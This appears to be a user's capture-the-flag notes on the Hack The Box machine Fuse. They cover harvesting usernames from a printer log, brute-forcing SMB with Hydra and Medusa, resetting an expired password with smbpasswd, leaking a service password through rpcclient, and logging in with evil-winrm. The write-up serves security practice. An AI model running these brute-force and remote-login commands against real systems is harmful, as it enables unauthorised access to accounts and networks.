- found domain in port 80 + all the usual ldap smb winrm
- opened the website and found a printer logger with usernames who initiated the print jobs and file names of printed documents 
- so made a user list with the usernames and a pass list with the file names
- ran hydra on smb and got three sets of creds all common pass Fabricorp01
 # Hydra v9.0 run at 2020-06-20 01:33:55 on fuse.htb smb (hydra -L users.txt -P passes.txt -o hydra_smb.txt smb://fuse.htb)

- tried to connect to services but got logon failure because passes had expired 
- Googled the error and found smbpasswd tool that could reset smb pass
- echo -e "Fabricorp01\nPassword00\nPassword00"|sudo smbpasswd -U bhult -r fuse.htb && rpcclient -U 'FABRICORP\bhult'%'Password00' -c enumprinters 10.10.10.193
- got pass $fab@s3Rv1ce$1
- hit smb with medusa using the all_users.txt and got pass $fab@s3Rv1ce$1
- evil-winrm -u svc-print -p '$fab@s3Rv1ce$1' -i fuse.htb
